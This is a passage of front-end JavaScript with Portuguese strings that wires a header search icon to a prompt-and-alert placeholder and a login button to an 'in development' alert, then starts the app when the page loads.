        document.querySelectorAll('.header-icon').forEach((icon, index) => {
            if (index === 0) {
                icon.addEventListener('click', () => {
                    const searchTerm = prompt('Digite o termo para busca:');
                    if (searchTerm) {
                        alert(`Buscando por: ${searchTerm}`);
                    }
                });
            }
        });

        // Botão entrar
        document.querySelector('.btn-entrar').addEventListener('click', () => {
            alert('Área de login - Em desenvolvimento');
        });
    }
}

// Inicializar a aplicação quando o DOM estiver pronto
document.addEventListener('DOMContentLoaded', () => {
    const app = new App();
    app.init();
});
